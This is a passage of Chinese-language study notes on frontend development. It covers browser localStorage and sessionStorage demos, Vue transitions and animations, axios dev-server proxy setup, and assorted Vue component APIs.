3. **用途**:
   - `sessionStorage`: 适用于在一次会话期间保留临时数据，例如用户登录状态、页面间传递数据等。
   - `localStorage`: 适用于长期存储数据，例如用户偏好设置、本地缓存等。
4. **存储大小**:
   - `sessionStorage`和`localStorage`存储大小通常在 5MB 到 10MB 之间（具体限制因浏览器而异）。
   - 为了确保数据的存储不会超过浏览器的限制，可以使用`try...catch`来捕获存储数据时可能抛出的异常。

### localStorage.html

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>localStorage</title>
	</head>
	<body>
		<h2>localStorage</h2>
		<button onclick="saveData()">点我保存一个数据</button>
		<button onclick="readData()">点我读取一个数据</button>
		<button onclick="deleteData()">点我删除一个数据</button>
		<button onclick="deleteAllData()">点我清空一个数据</button>

		<script type="text/javascript" >
			let p = {name:'张三',age:18}

			function saveData(){
				localStorage.setItem('msg','hello!!!')
				localStorage.setItem('msg2',666)
				localStorage.setItem('person',JSON.stringify(p))
			}
			function readData(){
				console.log(localStorage.getItem('msg'))
				console.log(localStorage.getItem('msg2'))

				const result = localStorage.getItem('person')
				console.log(JSON.parse(result))

				// console.log(localStorage.getItem('msg3'))
			}
			function deleteData(){
				localStorage.removeItem('msg2')
			}
			function deleteAllData(){
				localStorage.clear()
			}
		</script>
	</body>
</html>
```

### sessionStorage.html

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>sessionStorage</title>
	</head>
	<body>
		<h2>sessionStorage</h2>
		<button onclick="saveData()">点我保存一个数据</button>
		<button onclick="readData()">点我读取一个数据</button>
		<button onclick="deleteData()">点我删除一个数据</button>
		<button onclick="deleteAllData()">点我清空一个数据</button>

		<script type="text/javascript" >
			let p = {name:'张三',age:18}

			function saveData(){
				sessionStorage.setItem('msg','hello!!!')
				sessionStorage.setItem('msg2',666)
				sessionStorage.setItem('person',JSON.stringify(p))
			}
			function readData(){
				console.log(sessionStorage.getItem('msg'))
				console.log(sessionStorage.getItem('msg2'))

				const result = sessionStorage.getItem('person')
				console.log(JSON.parse(result))

				// console.log(sessionStorage.getItem('msg3'))
			}
			function deleteData(){
				sessionStorage.removeItem('msg2')
			}
			function deleteAllData(){
				sessionStorage.clear()
			}
		</script>
	</body>
</html>
```

### 存储数据格式转换

`JSON.parse()` 方法将一个JSON字符串解析为相应的JavaScript对象。

`JSON.stringify()` 是 JavaScript 中的一个方法，用于将JavaScript对象或值转换为JSON（JavaScript Object Notation）格式的字符串。

```javascript
// 存储数据
localStorage.setItem("name", "John"); // 字符串
localStorage.setItem("age", JSON.stringify(30)); // 数字（转换为字符串存储）
localStorage.setItem("isStudent", JSON.stringify(false)); // 布尔值（转换为字符串存储）

const user = {
  name: "Alice",
  age: 25
};
localStorage.setItem("user", JSON.stringify(user)); // 对象（转换为JSON字符串存储）

const colors = ["red", "green", "blue"];
localStorage.setItem("colors", JSON.stringify(colors)); // 数组（转换为JSON字符串存储）

const currentDate = new Date();
localStorage.setItem("currentDate", currentDate.toISOString()); // 日期对象（转换为字符串存储）

// 读取数据
const name = localStorage.getItem("name");
const age = JSON.parse(localStorage.getItem("age"));
const isStudent = JSON.parse(localStorage.getItem("isStudent"));
const storedUser = JSON.parse(localStorage.getItem("user"));
const storedColors = JSON.parse(localStorage.getItem("colors"));
const storedDate = new Date(localStorage.getItem("currentDate"));

```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <div>
        <button onclick="saveString()">存储一个字符串</button>
        <button onclick="saveNumber()">存储一个数字</button>
        <button onclick="saveBoolean()">存储一个布尔值</button>
        <button onclick="saveObject()">存储一个对象</button>
        <button onclick="saveArray()">存储一个数组</button>
        <button onclick="saveDate()">存储一个日期</button>
        <hr>
        <button onclick="getString()">读取一个字符串</button>
        <button onclick="getNumber()">读取一个数字</button>
        <button onclick="getBoolean()">读取一个布尔值</button>
        <button onclick="getObject()">读取一个对象</button>
        <button onclick="getArray()">读取一个数组</button>
        <button onclick="getDate()">读取一个日期</button>
    </div>
    <script type="text/javascript">
        // 字符串存储
        function saveString() {
            console.log('name')
            localStorage.setItem("name", "John");
        }
        // 数字（转换为字符串存储）
        function saveNumber() {
            localStorage.setItem("age", JSON.stringify(30));
        }
        // 布尔值（转换为字符串存储）
        function saveBoolean() {
            localStorage.setItem("isStudent", JSON.stringify(false));
        }
        // 对象（转换为JSON字符串存储）
        function saveObject() {
            const user = {
                name: "Alice",
                age: 25
            };
            localStorage.setItem("user", JSON.stringify(user));
        }
        // 数组（转换为JSON字符串存储）
        function saveArray(){
            const colors = ["red", "green", "blue"];
            localStorage.setItem("colors", JSON.stringify(colors));
        }
        // 日期对象（转换为字符串）
        function saveDate() {
            const currentDate = new Date();
            localStorage.setItem("currentDate", currentDate.toISOString());
        }

        // 读取数据
        function getString() {
            const name = localStorage.getItem("name");
            console.log(name)
        }
        function getNumber() {
            const age = JSON.parse(localStorage.getItem("age"));
            console.log(age)
        }
        function getBoolean() {
            const isStudent = JSON.parse(localStorage.getItem("isStudent"));
            console.log(isStudent)
        }
        function getObject() {
            const storedUser = JSON.parse(localStorage.getItem("user"));
            console.log(storedUser)
        }
        function getArray() {
            const storedColors = JSON.parse(localStorage.getItem("colors"));
            console.log(storedColors)
        }
        function getDate() {
            const storedDate = new Date(localStorage.getItem("currentDate"));
            console.log(storedDate)
        }
    </script>
</body>

</html>
```



------

## 过渡与动画

### Test.vue

（动画实现，点击按钮显示隐藏div）

1. transition标签包裹目标。
2. 设置动画。
3. 运用进入和离去动画。（注意命名name）
4. appear 属性打开页面就执行一次动画。

```html
<template>
  <div>
    <button @click="isShow = !isShow">显现/消逝</button>
    <!-- 命名name v- hh-  -->
    <transition name="hh" appear>
      <h1 v-show="isShow">hello world</h1>
    </transition>
  </div>
</template>

<script>
export default {
  name: "TestDemo",
  data() {
    return {
      isShow: true,
    };
  },
};
</script>

<style scoped>
h1 {
  background-color: #e88;
}
/* 使用动画 */
.hh-enter-active {
  animation: my 1s;
}
.hh-leave-active {
  animation: my 1s reverse;
}
/* 自定义动画 */
@keyframes my {
  from {
    transform: translateX(-100%);
  }
  to {
    transform: translateX(0px);
  }
}
</style>
```

### Test2.vue

（过渡实现）

```html
<template>
  <div>
    <button @click="isShow = !isShow">显现/消逝</button>
    <!-- name v- hh-  -->
    <transition-group name="hh" appear>
      <h1 v-show="!isShow" key="1">hello world</h1>
      <h1 v-show="isShow" key="2">hello vue</h1>
    </transition-group>
  </div>
</template>

<script>
export default {
  name: "TestDemo2",
  data() {
    return {
      isShow: true,
    };
  },
};
</script>

<style scoped>
h1 {
  background-color: #e88;
    /*transition: 0.5s linear;*/
}
/* 不破坏h1样式 过渡0.5s匀速*/
.hh-enter-active,
.hh-leave-active {
  transition: 0.5s linear;
}
/* 进入起点，离开终点 */
.hh-enter,
.hh-leave-to {
  transform: translateX(-100%);
}

/* 进入终点，离开起点 */
.hh-enter-to,
.hh-leave {
  transform: translateX(0);
}
</style>
```

### Test3.vue

（多元素过渡与动画 transition-group 标签包裹，每个元素必须要唯一key）

1. 引入动画库 npm install animate.css --save
2. import "animate.css";
3. 设置属性enter-active-class，leave-active-class

```html
<template>
  <div>
    <button @click="isShow = !isShow">显现/消逝</button>
    <!-- name v- hh-  -->
    <transition-group
      name="animate__animated animate__bounce"
      appear
      enter-active-class="animate__swing"
      leave-active-class="animate__backOutUp"
    >
      <h1 v-show="!isShow" key="1">hello world</h1>
      <h1 v-show="isShow" key="2">hello vue</h1>
    </transition-group>
  </div>
</template>

<script>
import "animate.css";
export default {
  name: "TestDemo3",
  data() {
    return {
      isShow: true,
    };
  },
};
</script>

<style scoped>
h1 {
  background-color: #e88;
}
</style>
```

------

## axios配置代理

### 什么是跨域

​		浏览器从一个域名的网页去请求另一个域名的资源时，域名、端口、协议任一不同，都会导致跨域问题。即前端接口去调用不在同一个域内的后端服务器而产生的问题。

### 如何解决跨域问题

​		代理服务器的主要思想是通过建立一个端口号和前端相同的代理服务器进行中转，从而解决跨域问题。因为代理服务器与前端处于同一个域中，不会产生跨域问题；而且代理服务器与服务器之间的通信是后端之间的通信，不会产生跨域问题。

*红色框代表浏览器，粉色框代表代理服务器，蓝色框代表后端的服务器*

![image-20230331101111407](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230331101111407.png)

首先安装axios:`npn i axios` 并引用：import axios from 'axios'

### 配置前端请求

```html
<template>
	<div>
		<button @click="getStudents">获取学生信息</button>
		<button @click="getCars">获取汽车信息</button>
	</div>
</template>

<script>
	import axios from 'axios'
	export default {
		name:'App',
		methods: {
            // 方法一
			getStudents(){
                // 前端有同名students不会用请求的后端同名文件
				axios.get('http://localhost:8080/students').then(
					response => {
						console.log('请求成功了',response.data)
					},
					error => {
						console.log('请求失败了',error.message)
					}
				)
			},
            // 方法二
			getCars(){
                // 加上前缀demo走代理，不加不走
				axios.get('http://localhost:8080/demo/cars').then(
					response => {
						console.log('请求成功了',response.data)
					},
					error => {
						console.log('请求失败了',error.message)
					}
				)
			}
		},
	}
</script>

```

### 代理方法一

1. 用axios发请求。

2. vue.config.js中开启代理。

   **注意事项**：

   不能控制走不走代理，解决不来前后端同名文件问题。

   不能配置多个代理。

vue.config.js

```javascript
//开启代理服务器（方式一）
devServer: {
    // 只能代理5000的请求代理
    proxy: 'http://localhost:5000'
}, 
```

### 代理方法二

vue.config.js

```javascript
devServer: {
    proxy: {
        // '/atguigu' 请求头
      '/atguigu': {
             // 代理目标的基础路径
			target: 'http://localhost:5000',
             // 重写路径，正则表达式
			pathRewrite:{'^/atguigu':''},
             // 用于控制请求头中的host值（回答服务器询问是否说谎来自8080...，默认说）
			// changeOrigin: true 
                
      },
      '/demo': {
			target: 'http://localhost:5001',
			pathRewrite:{'^/demo':''},
			// ws: true, 
			// changeOrigin: true 
      }
    }
  }
}
```

------

### vue-resource配置请求

1. 安装库。npm i vue-resource（vue1.0使用多，维护更新慢）
2. 引入库并使用。（1）import vueResource from 'vue-resource'    （2）Vue.**use**(vueResource)

------

## props和$attrs和$listeners

1. 声明接收了传过来的数据，数据出现在VueComponent上。

2. 没有声明接收传过来的数据，出现在$attrs。

3. 可以通过$attrs.xxx得到数据。

   ps: $listeners 是组件的实例属性，可以获取父组件给子组件传递自定义事件

   ```javascript
   <template>
       <a :title = "title">
           <el-button v-bind=""$attrs" v-bind="$listeners"> </el-button>
       </a>
   </template>
                                      
   <scipt>
       import ElButton from './elbutton'
   	export default{
   		name: "ElButton"
               props:["title"],
                   mounted(){
                    console.log(this.$attrs) //{type="success" icon ="el-icon-plus" size="mini" title="演示"}
                    console.log(this.$listeners) // alertaa
               }
       }
   </script>
   
   
   <template>
       <ElButton type="success" icon ="el-icon-plus" size="mini" title="演示" @click="alertaa" />
   </template>
                                      
   <scipt>
           export default{
   			name:'APP',
         		components:{ElButton},
                methods:{
                    alertaa(){
                        alert('aa')
   				}
                }
   }
   </script>
   ```



## $children和$refs和$parent

1. $children 获取父组件中全部子组件的实例，返回一个包含的数组（this.$children[0].xxx）
2. $refs返回子组件的实例（this.$refs.标记.xxx）
3. $parent获取自己父组件的实例（this.$parent.xxx）

ps：以上例子获取数据xxx（可以是方法）



------

## 关于插槽

1. 数据会出现在$slots（是一个虚拟节点VNode）

------

## nanoid

// id生成 import { nanoid } from 'nanoid'   
// nanoid()



------

## not found 'xxx'问题

npm i xxx

------

## ElementUI

```tex
7.1移动端常用U组件库
1. Vant         https://youzan.github.io/vant
2. Cube Ul      https://didi.github.io/cube-ui
3. Mint Ul      http://mint-ui.github.io
7.2 PC端常用U组件库<
1. Element Ul   https://element.eleme.cn
2. lView Ul     https://www.iviewui.com
```

1.import 'element-ui/lib/theme/'



## scoped&深度选择器

1. 当前组件样式设置了scoped的样式，会作用在当前组件，也会作用在当前组件引用的子组件的根节点中。
2. `选择器:deep( 选择器 ){  }`可以把scoped中的样式作用在子组件（**深度选择器**）



------

------

------

# Vue3
